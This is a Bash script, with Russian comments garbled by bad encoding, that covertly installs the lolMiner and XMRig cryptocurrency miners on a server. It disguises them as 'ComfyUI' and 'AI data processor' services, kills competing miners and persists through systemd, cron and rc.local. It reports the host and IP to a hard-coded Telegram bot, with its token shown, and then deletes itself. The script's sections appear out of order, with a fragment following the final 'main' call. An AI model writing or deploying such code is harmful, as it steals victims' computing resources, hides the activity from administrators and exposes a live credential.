#!/bin/bash

#==============================================================================
# –ë–õ–û–ö –ö–û–ù–§–ò–ì–£–†–ê–¶–ò–ò (–õ–ï–ì–ï–ù–î–ê: AI/ML –°–ï–†–í–ï–†)
#==============================================================================
KRYPTEX_IDENTIFIER="krxYNV2DZQ"
TELEGRAM_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TELEGRAM_CHAT_ID="7032066912"
GPU_POOL="etc.kryptex.network:7033"
CPU_POOL="xmr.kryptex.network:7029"

HOSTNAME_VAR=$(hostname 2>/dev/null || echo "unknown-host")
SERVER_IP=$(curl -s -4 ifconfig.me 2>/dev/null || curl -s -6 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}' 2>/dev/null || echo "0.0.0.0")
WORKER_ID=$(echo "$SERVER_IP" | tr -d '.')
WORKER_NAME="${KRYPTEX_IDENTIFIER}.${WORKER_ID}"

#==============================================================================
# –ì–õ–û–ë–ê–õ–¨–ù–´–ï –°–ò–°–¢–ï–ú–ù–´–ï –ü–ï–†–ï–ú–ï–ù–ù–´–ï (–ü–û–î –ú–ê–°–ö–ò–†–û–í–ö–û–ô)
#==============================================================================
BASE_DIR="/opt/system-daemons"
# --- –ú–ê–°–ö–ò–†–û–í–ö–ê GPU ---
GPU_SERVICE_NAME="comfy-ui-service"
GPU_DIR="$BASE_DIR/comfyui"
GPU_LOG_FILE="/var/log/comfyui.log"
GPU_SCRIPT_NAME="start_comfy.sh"
# --- –ú–ê–°–ö–ò–†–û–í–ö–ê CPU ---
CPU_SERVICE_NAME="ai-data-processor"
CPU_DIR="$BASE_DIR/ai-data"
CPU_LOG_FILE="/var/log/ai-data.log"

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –¢–†–ê–ù–°–õ–ò–¢–ï–†–ê–¶–ò–ò –ò –í–´–í–û–î–ê –í –ö–û–ù–°–û–õ–¨
#==============================================================================
echo_t() {
    local text="$1"
    local translit_text=$(echo "$text" | sed \
        -e 's/–∞/a/g; s/–±/b/g; s/–≤/v/g; s/–≥/g/g; s/–¥/d/g; s/–µ/e/g; s/—ë/yo/g; s/–∂/zh/g; s/–∑/z/g; s/–∏/i/g; s/–π/y/g; s/–∫/k/g; s/–ª/l/g; s/–º/m/g; s/–Ω/n/g; s/–æ/o/g; s/–ø/p/g; s/—Ä/r/g; s/—Å/s/g; s/—Ç/t/g; s/—É/u/g; s/—Ñ/f/g; s/—Ö/kh/g; s/—Ü/ts/g; s/—á/ch/g; s/—à/sh/g; s/—â/shch/g; s/—ä//g; s/—ã/y/g; s/—å//g; s/—ç/e/g; s/—é/yu/g; s/—è/ya/g' \
        -e 's/–ê/A/g; s/–ë/B/g; s/–í/V/g; s/–ì/G/g; s/–î/D/g; s/–ï/E/g; s/–Å/Yo/g; s/–ñ/Zh/g; s/–ó/Z/g; s/–ò/I/g; s/–ô/Y/g; s/–ö/K/g; s/–õ/L/g; s/–ú/M/g; s/–ù/N/g; s/–û/O/g; s/–ü/P/g; s/–†/R/g; s/–°/S/g; s/–¢/T/g; s/–£/U/g; s/–§/F/g; s/–•/Kh/g; s/–¶/Ts/g; s/–ß/Ch/g; s/–®/Sh/g; s/–©/Shch/g; s/–™//g; s/–´/Y/g; s/–¨//g; s/–≠/E/g; s/–Æ/Yu/g; s/–Ø/Ya/g'
    )
    echo "$translit_text"
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –£–í–ï–î–û–ú–õ–ï–ù–ò–ô –í TELEGRAM
#==============================================================================
send_telegram_notification() {
    local message="$1"
    curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
        -d "chat_id=${TELEGRAM_CHAT_ID}" \
        -d "text=${message}" \
        -d "parse_mode=HTML" > /dev/null 2>&1
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –ü–†–û–í–ï–†–ö–ò –ò –£–°–¢–ê–ù–û–í–ö–ò –ó–ê–í–ò–°–ò–ú–û–°–¢–ï–ô
#==============================================================================
install_dependencies() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uvedomlenie o nachale raboty otpravleno"
    echo ""
    
    # –û—á–∏—Å—Ç–∫–∞ –æ–∫—Ä—É–∂–µ–Ω–∏—è
    ensure_clean_environment
    if [ $? -ne 0 ]; then
        send_telegram_notification "‚ùå <b>Oshibka ochistki okruzheniya</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –º–æ–¥—É–ª–µ–π
    install_compute_modules
    if [ $? -ne 0 ]; then
        send_telegram_notification "‚ùå <b>Oshibka ustanovki AI-moduley</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # –°–æ–∑–¥–∞–Ω–∏–µ —Å–ª—É–∂–±
    create_systemd_services
    if [ $? -ne 0 ]; then
        send_telegram_notification "‚ùå <b>Oshibka sozdaniya AI-sluzhb</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # –°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤
    create_management_tools
    if [ $? -ne 0 ]; then
        send_telegram_notification "‚ùå <b>Oshibka sozdaniya instrumentov</b> na ${HOSTNAME_VAR}"
        exit 1
    fi
    echo ""
    
    # –û—Å—Ç–∞–Ω–æ–≤–∫–∞ —Å—Ç–∞—Ä—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤ –ø–µ—Ä–µ–¥ –∑–∞–ø—É—Å–∫–æ–º –Ω–æ–≤—ã—Ö
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka starykh protsessov..."
    /usr/local/bin/stop-ai > /dev/null 2>&1
    sleep 3
    
    # –ê–∫—Ç–∏–≤–∞—Ü–∏—è —Å–ª—É–∂–±
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd i aktivatsiya sluzhb..."
    systemctl daemon-reload
    
    systemctl enable --now "${GPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Sluzhba ${GPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úó Oshibka aktivatsii ${GPU_SERVICE_NAME}"
    fi
    
    systemctl enable --now "${CPU_SERVICE_NAME}"
    if [ $? -eq 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úì Sluzhba ${CPU_SERVICE_NAME} aktivirovana i zapushchena"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úó Oshibka aktivatsii ${CPU_SERVICE_NAME}"
    fi
    echo ""
    
    # –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞
    setup_autostart
    echo ""
    
    # –ñ–¥–µ–º –∑–∞–ø—É—Å–∫–∞ –∏ –ø—Ä–æ–≤–µ—Ä—è–µ–º —Å—Ç–∞—Ç—É—Å
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ozhidanie zapuska sluzhb..."
    sleep 5
    
    gpu_status=$(systemctl is-active "${GPU_SERVICE_NAME}")
    cpu_status=$(systemctl is-active "${CPU_SERVICE_NAME}")
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –ø—Ä–æ—Ü–µ—Å—Å—ã
    gpu_running="ne zapushchen"
    cpu_running="ne zapushchen"
    
    if pgrep -f "lolMiner.*ETCHASH" > /dev/null; then
        gpu_running="zapushchen (PID: $(pgrep -f 'lolMiner.*ETCHASH'))"
    fi
    
    if pgrep -f "xmrig" > /dev/null; then
        cpu_running="zapushchen (PID: $(pgrep -f 'xmrig'))"
    fi
    
    # –§–∏–Ω–∞–ª—å–Ω–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Otpravka final'nogo uvedomleniya..."
    send_telegram_notification "üéâ <b>AI-infrastruktura uspeshno razvernuta!</b>

üñ•Ô∏è Khost: ${HOSTNAME_VAR}
üåê IP: ${SERVER_IP}
üîë Worker ID: ${WORKER_NAME}
‚è∞ Vremya zaversheniya: $(date '+%Y-%m-%d %H:%M:%S')

üìä <b>Status sluzhb:</b>
üé® ComfyUI (lolMiner): ${gpu_status}
   Protsess: ${gpu_running}

‚öôÔ∏è AI Data (XMRig): ${cpu_status}
   Protsess: ${cpu_running}

üìÅ <b>Ustanovlennye komponenty:</b>
‚Ä¢ GPU: ${GPU_DIR}/lolMiner
‚Ä¢ CPU: ${CPU_DIR}/${CPU_SERVICE_NAME}
‚Ä¢ Skrypty: start-ai, stop-ai, status-ai

üìù <b>Logi:</b>
‚Ä¢ GPU: ${GPU_LOG_FILE}
‚Ä¢ CPU: ${CPU_LOG_FILE}

üéØ Ispol'zuyte komandu <code>status-ai</code> dlya proverki raboty"
    
    echo ""
    echo_t "======================================================================="
    echo_t "  ‚úì AI-INFRASTRUKTURA USPESHNO RAZVERNUTA"
    echo_t "  Zaversheno: $(date '+%Y-%m-%d %H:%M:%S')"
    echo_t "======================================================================="
    echo ""
    echo_t "üìã Status:"
    /usr/local/bin/status-ai
    echo ""
    echo_t "üìã Dostupnye komandy:"
    echo_t "  start-ai   - Zapusk AI sluzhb"
    echo_t "  stop-ai    - Ostanovka AI sluzhb"
    echo_t "  status-ai  - Proverka statusa AI sluzhb"
    echo ""
    echo_t "üí° Maynery nastroeny na avtozapusk pri perezagruzke"
    echo_t "    (systemd + cron + rc.local)"
    echo ""
    
    # –°–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–∞
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udalenie skripta..."
    sleep 2
    rm -f -- "$0"
    
    exit 0
}

#==============================================================================
# –ó–ê–ü–£–°–ö –ì–õ–ê–í–ù–û–ô –§–£–ù–ö–¶–ò–ò
#==============================================================================
main "$@"M:%S')] Proveryayu i ustanavlivayu zavisimosti..."
    
    if ! command -v wget &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu wget..."
        apt-get update -qq && apt-get install -y wget curl 2>/dev/null
    fi
    
    if ! command -v curl &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu curl..."
        apt-get install -y curl 2>/dev/null
    fi
    
    if ! command -v crontab &> /dev/null; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanavlivayu cron..."
        apt-get install -y cron 2>/dev/null
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Zavisimosti ustanovleny"
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –û–ß–ò–°–¢–ö–ò –û–ö–†–£–ñ–ï–ù–ò–Ø (–£–ü–†–û–©–ï–ù–ù–ê–Ø –í–ï–†–°–ò–Ø)
#==============================================================================
ensure_clean_environment() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo uproshchennoy ochistki okruzheniya..."
    local killed_count=0
    local removed_lines=0
    
    # --- –£–î–ê–õ–ï–ù–ò–ï –¢–û–õ–¨–ö–û –°–¢–ê–†–´–• XMRIG –ò LOLMINER ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk i zavershenie starykh protsessov..."
    
    # –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–æ–ª—å–∫–æ –µ—Å–ª–∏ –æ–Ω–∏ –ù–ï –≤ –Ω–∞—à–∏—Ö –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è—Ö
    for proc_name in "xmrig" "lolMiner"; do
        if pgrep -f "$proc_name" > /dev/null 2>&1; then
            # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –Ω–∞—à –ª–∏ —ç—Ç–æ –ø—Ä–æ—Ü–µ—Å—Å
            for pid in $(pgrep -f "$proc_name"); do
                proc_path=$(readlink -f /proc/$pid/exe 2>/dev/null)
                if [[ ! "$proc_path" =~ "$BASE_DIR" ]]; then
                    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhen staryy protsess: $proc_name (PID: $pid)"
                    kill -9 $pid 2>/dev/null
                    ((killed_count++))
                fi
            done
        fi
    done

    # --- –û–ß–ò–°–¢–ö–ê CRONTAB ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka crontab..."
    local cron_temp=$(mktemp)
    crontab -l > "$cron_temp" 2>/dev/null
    
    if [ -s "$cron_temp" ]; then
        local original_lines=$(wc -l < "$cron_temp")
        # –£–¥–∞–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Å—Ç—Ä–æ–∫–∏ —Å –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω—ã–º–∏ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º–∏, –Ω–æ –Ω–µ –Ω–∞—à–∏
        grep -v -E "(curl.*miner|wget.*miner|/tmp/.*miner)" "$cron_temp" > "${cron_temp}.clean"
        local cleaned_lines=$(wc -l < "${cron_temp}.clean")
        removed_lines=$((original_lines - cleaned_lines))
        
        if [ $removed_lines -gt 0 ]; then
            crontab "${cron_temp}.clean"
            echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Udaleno $removed_lines zapisey iz crontab"
        fi
        rm -f "${cron_temp}.clean"
    fi
    rm -f "$cron_temp"

    # --- –û–ß–ò–°–¢–ö–ê RC.LOCAL ---
    if [ -f /etc/rc.local ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ochistka /etc/rc.local..."
        sed -i '/curl.*miner\|wget.*miner/d' /etc/rc.local 2>/dev/null
    fi

    # --- –û–ß–ò–°–¢–ö–ê –ü–û–î–û–ó–†–ò–¢–ï–õ–¨–ù–´–• SYSTEMD –°–õ–£–ñ–ë (–∫—Ä–æ–º–µ –Ω–∞—à–∏—Ö) ---
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Poisk podozritel'nykh systemd sluzhb..."
    for service in $(systemctl list-units --type=service --all 2>/dev/null | grep -E "miner|xmr|kinsing" | awk '{print $1}'); do
        # –ü—Ä–æ–ø—É—Å–∫–∞–µ–º –Ω–∞—à–∏ —Å–ª—É–∂–±—ã
        if [[ "$service" == "$GPU_SERVICE_NAME"* ]] || [[ "$service" == "$CPU_SERVICE_NAME"* ]]; then
            continue
        fi
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Obnaruzhena podozritel'naya sluzhba: $service"
        systemctl stop "$service" 2>/dev/null
        systemctl disable "$service" 2>/dev/null
        rm -f "/etc/systemd/system/$service" 2>/dev/null
    done

    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Uproshchennaya ochistka zavershena. Zaversheno protsessov: $killed_count"
    
    if [ $killed_count -gt 0 ] || [ $removed_lines -gt 0 ]; then
        send_telegram_notification "üßπ <b>Ochistka okruzheniya na ${HOSTNAME_VAR}</b>

Zaversheno starykh protsessov: $killed_count
Udaleno cron zapisey: $removed_lines
IP: ${SERVER_IP}"
    fi
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –£–°–¢–ê–ù–û–í–ö–ò AI-–ú–û–î–£–õ–ï–ô
#==============================================================================
install_compute_modules() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nachalo ustanovki AI-moduley..."
    
    # –°–æ–∑–¥–∞–Ω–∏–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–π
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie direktoriy..."
    mkdir -p "$GPU_DIR" "$CPU_DIR"
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' direktorii"
        send_telegram_notification "‚ùå Oshibka sozdaniya direktoriy na ${HOSTNAME_VAR}"
        return 1
    fi
    
    # ========== –£–°–¢–ê–ù–û–í–ö–ê lolMiner –¥–ª—è GPU (ETC) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka lolMiner dlya ComfyUI (GPU)..."
    cd "$GPU_DIR" || return 1
    
    local lolminer_url="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98/lolMiner_v1.98_Lin64.tar.gz"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie lolMiner..."
    if wget -q "$lolminer_url"; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] lolMiner skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' lolMiner"
        send_telegram_notification "‚ùå Oshibka skachivaniya GPU-modulya (lolMiner) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka lolMiner..."
    tar -xzf lolMiner_v1.98_Lin64.tar.gz --strip-components=1
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' lolMiner"
        return 1
    fi
    rm -f lolMiner_v1.98_Lin64.tar.gz
    
    # –°–æ–∑–¥–∞–Ω–∏–µ —Å—Ç–∞—Ä—Ç–æ–≤–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è lolMiner (–¢–û–ß–ù–û –ö–ê–ö –í –†–ê–ë–û–ß–ï–ú –°–ö–†–ò–ü–¢–ï)
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie startovogo skripta lolMiner..."
    cat > "$GPU_DIR/$GPU_SCRIPT_NAME" <<EOF
#!/bin/bash
cd $GPU_DIR
./lolMiner --algo ETCHASH --pool $GPU_POOL --user $WORKER_NAME --tls off --nocolor
EOF
    
    chmod +x "$GPU_DIR/$GPU_SCRIPT_NAME"
    chmod +x "$GPU_DIR/lolMiner" 2>/dev/null
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ lolMiner —Å—É—â–µ—Å—Ç–≤—É–µ—Ç
    if [ -f "$GPU_DIR/lolMiner" ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úÖ GPU-modul' (lolMiner) uspeshno ustanovlen"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚ùå OSHIBKA: lolMiner ne nayden posle raspakovki"
        return 1
    fi
    
    # ========== –£–°–¢–ê–ù–û–í–ö–ê XMRig –¥–ª—è CPU ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka XMRig dlya AI Data Processor (CPU)..."
    cd "$CPU_DIR" || return 1
    
    local cpu_url="https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Skachivanie XMRig..."
    if wget -q "$cpu_url"; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] XMRig skachan uspeshno"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' skachat' XMRig"
        send_telegram_notification "‚ùå Oshibka skachivaniya CPU-modulya (XMRig) na ${HOSTNAME_VAR}"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Raspakovka XMRig..."
    tar -xzf xmrig-*-linux-x64.tar.gz --strip-components=1
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' raspakovat' XMRig"
        return 1
    fi
    rm -f xmrig-*-linux-x64.tar.gz
    
    # –ü–µ—Ä–µ–∏–º–µ–Ω–æ–≤—ã–≤–∞–µ–º xmrig (–µ—Å–ª–∏ –Ω—É–∂–Ω–æ)
    if [ -f "$CPU_DIR/xmrig" ]; then
        mv "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME" 2>/dev/null || cp "$CPU_DIR/xmrig" "$CPU_DIR/$CPU_SERVICE_NAME"
        chmod +x "$CPU_DIR/$CPU_SERVICE_NAME"
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚úÖ CPU-modul' (XMRig) uspeshno ustanovlen"
    else
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] ‚ùå OSHIBKA: xmrig ne nayden posle raspakovki"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Ustanovka AI-moduley zavershena"
    send_telegram_notification "‚úÖ AI-moduli ustanovleny na ${HOSTNAME_VAR}

üé® GPU: lolMiner (ETCHASH)
‚öôÔ∏è CPU: XMRig v6.18.0 (Monero)
üîë Worker: ${WORKER_NAME}"
    
    return 0
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –°–û–ó–î–ê–ù–ò–Ø SYSTEMD –°–õ–£–ñ–ë
#==============================================================================
create_systemd_services() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie systemd sluzhb..."
    
    # ========== GPU –°–ª—É–∂–±–∞ (lolMiner) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $GPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${GPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=ComfyUI AI Image Generation Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash ${GPU_DIR}/${GPU_SCRIPT_NAME}
Restart=always
RestartSec=10
StandardOutput=append:${GPU_LOG_FILE}
StandardError=append:${GPU_LOG_FILE}
WorkingDirectory=${GPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $GPU_SERVICE_NAME"
        send_telegram_notification "‚ùå Oshibka sozdaniya GPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $GPU_SERVICE_NAME sozdana"
    
    # ========== CPU –°–ª—É–∂–±–∞ (XMRig) ==========
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie sluzhby $CPU_SERVICE_NAME..."
    cat > "/etc/systemd/system/${CPU_SERVICE_NAME}.service" <<EOF
[Unit]
Description=AI Data Processing Service
After=network.target

[Service]
Type=simple
ExecStart=${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages
Restart=always
RestartSec=10
StandardOutput=append:${CPU_LOG_FILE}
StandardError=append:${CPU_LOG_FILE}
WorkingDirectory=${CPU_DIR}
User=root

[Install]
WantedBy=multi-user.target
EOF

    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' sozdat' sluzhbu $CPU_SERVICE_NAME"
        send_telegram_notification "‚ùå Oshibka sozdaniya CPU sluzhby na ${HOSTNAME_VAR}"
        return 1
    fi
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sluzhba $CPU_SERVICE_NAME sozdana"
    
    # –ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∫–∞ systemd
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Perezagruzka systemd daemon..."
    systemctl daemon-reload
    
    if [ $? -ne 0 ]; then
        echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] OSHIBKA: Ne udalos' perezagruzit' systemd daemon"
        return 1
    fi
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd sluzhby uspeshno sozdany"
    send_telegram_notification "‚úÖ Systemd sluzhby sozdany na ${HOSTNAME_VAR}"
    
    return 0
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –î–û–ë–ê–í–õ–ï–ù–ò–Ø –í –ê–í–¢–û–ó–ê–ü–£–°–ö
#==============================================================================
setup_autostart() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Nastroyka avtozapuska sluzhb..."
    
    # Systemd enable
    systemctl enable "${GPU_SERVICE_NAME}" 2>/dev/null
    systemctl enable "${CPU_SERVICE_NAME}" 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Systemd avtozapusk nastroen"
    
    # Cron @reboot (–¥–æ–±–∞–≤–ª—è–µ–º —Å –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ–º –≤ –ª–æ–≥–∏)
    (crontab -l 2>/dev/null | grep -v "${GPU_DIR}\|${CPU_DIR}"; \
     echo "@reboot ${GPU_DIR}/${GPU_SCRIPT_NAME} > ${GPU_LOG_FILE} 2>&1 &"; \
     echo "@reboot ${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages > ${CPU_LOG_FILE} 2>&1 &") | crontab - 2>/dev/null
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Cron @reboot nastroen"
    
    # rc.local
    if [ ! -f /etc/rc.local ]; then
        echo '#!/bin/bash' > /etc/rc.local
        echo 'exit 0' >> /etc/rc.local
        chmod +x /etc/rc.local
    fi
    
    grep -q "${GPU_SCRIPT_NAME}" /etc/rc.local || sed -i "/exit 0/i ${GPU_DIR}/${GPU_SCRIPT_NAME} > ${GPU_LOG_FILE} 2>&1 &" /etc/rc.local
    grep -q "${CPU_SERVICE_NAME}" /etc/rc.local || sed -i "/exit 0/i ${CPU_DIR}/${CPU_SERVICE_NAME} -o ${CPU_POOL} -u ${WORKER_NAME} -p x --randomx-1gb-pages > ${CPU_LOG_FILE} 2>&1 &" /etc/rc.local
    chmod +x /etc/rc.local
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] rc.local nastroen"
    
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Mnozhestvennye metody avtozapuska nastroeny"
}

#==============================================================================
# –§–£–ù–ö–¶–ò–Ø –°–û–ó–î–ê–ù–ò–Ø –ò–ù–°–¢–†–£–ú–ï–ù–¢–û–í –£–ü–†–ê–í–õ–ï–ù–ò–Ø
#==============================================================================
create_management_tools() {
    echo_t "[$(date '+%Y-%m-%d %H:%M:%S')] Sozdanie instrumentov upravleniya..."
    
    # ========== start-ai ==========
    cat > "/usr/local/bin/start-ai" <<EOF
#!/bin/bash
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Zapusk AI sluzhb..."

# Zapusk cherez systemd
systemctl start "${GPU_SERVICE_NAME}"
systemctl start "${CPU_SERVICE_NAME}"

sleep 2

# Proverka statusa
if systemctl is-active --quiet "${GPU_SERVICE_NAME}"; then
    echo "‚úÖ ${GPU_SERVICE_NAME} zapushchen"
else
    echo "‚ùå ${GPU_SERVICE_NAME} ne zapushchen"
fi

if systemctl is-active --quiet "${CPU_SERVICE_NAME}"; then
    echo "‚úÖ ${CPU_SERVICE_NAME} zapushchen"
else
    echo "‚ùå ${CPU_SERVICE_NAME} ne zapushchen"
fi

# Otpravka uvedomleniya
SERVER_IP=\$(curl -s -4 ifconfig.me || echo "unknown")
curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \\
    -d "chat_id=${TELEGRAM_CHAT_ID}" \\
    -d "text=üöÄ <b>AI sluzhby zapushcheny</b>%0A%0AHost: \$(hostname)%0AIP: \${SERVER_IP}%0AVremya: \$(date)" \\
    -d "parse_mode=HTML" > /dev/null 2>&1
EOF
    chmod +x "/usr/local/bin/start-ai"
    
    # ========== stop-ai ==========
    cat > "/usr/local/bin/stop-ai" <<'EOF'
#!/bin/bash
echo "[$(date '+%Y-%m-%d %H:%M:%S')] Ostanovka AI sluzhb..."

systemctl stop "comfy-ui-service"
systemctl stop "ai-data-processor"

# Prinuditel'noe zavershenie protsessov
pkill -f "lolMiner.*ETCHASH"
pkill -f "xmrig"
sleep 2
pkill -9 -f "lolMiner.*ETCHASH" 2>/dev/null
pkill -9 -f "xmrig" 2>/dev/null

echo "‚úÖ AI sluzhby ostanovleny"
EOF
    chmod +x "/usr/local/bin/stop-ai"
    
    # ========== status-ai ==========
    cat > "/usr/local/bin/status-ai" <<EOF
#!/bin/bash
echo "=== Status AI-sluzhb ==="

if pgrep -f "lolMiner.*ETCHASH" > /dev/null; then
    echo "‚úÖ ComfyUI Service (GPU): Zapushchen (PID: \$(pgrep -f 'lolMiner.*ETCHASH'))"
else
    echo "‚ùå ComfyUI Service (GPU): Ne zapushchen"
fi

if pgrep -f "xmrig" > /dev/null; then
    echo "‚úÖ AI Data Processor (CPU): Zapushchen (PID: \$(pgrep -f 'xmrig'))"
else
    echo "‚ùå AI Data Processor (CPU): Ne zapushchen"
fi

echo ""
echo "=== Logi ComfyUI (poslednie 5 strok) ==="
tail -5 ${GPU_LOG_FILE} 2>/dev/null || echo "Log pust ili otsutstvuet"

echo ""
echo "=== Logi AI Data Processor (poslednie 5 strok) ==="
tail -5 ${CPU_LOG_FILE} 2>/dev/null || echo "Log pust ili otsutstvuet"

# Otpravka v Telegram
GPU_STATUS=\$(systemctl is-active comfy-ui-service)
CPU_STATUS=\$(systemctl is-active ai-data-processor)
GPU_LOGS=\$(tail -3 ${GPU_LOG_FILE} 2>/dev/null || echo "net dannyh")
CPU_LOGS=\$(tail -3 ${CPU_LOG_FILE} 2>/dev/null || echo "net dannyh")

MESSAGE="üìä <b>Status AI-sluzhb</b>

Host: \$(hostname)
IP: \$(curl -s ifconfig.me)

üé® ComfyUI: \${GPU_STATUS}
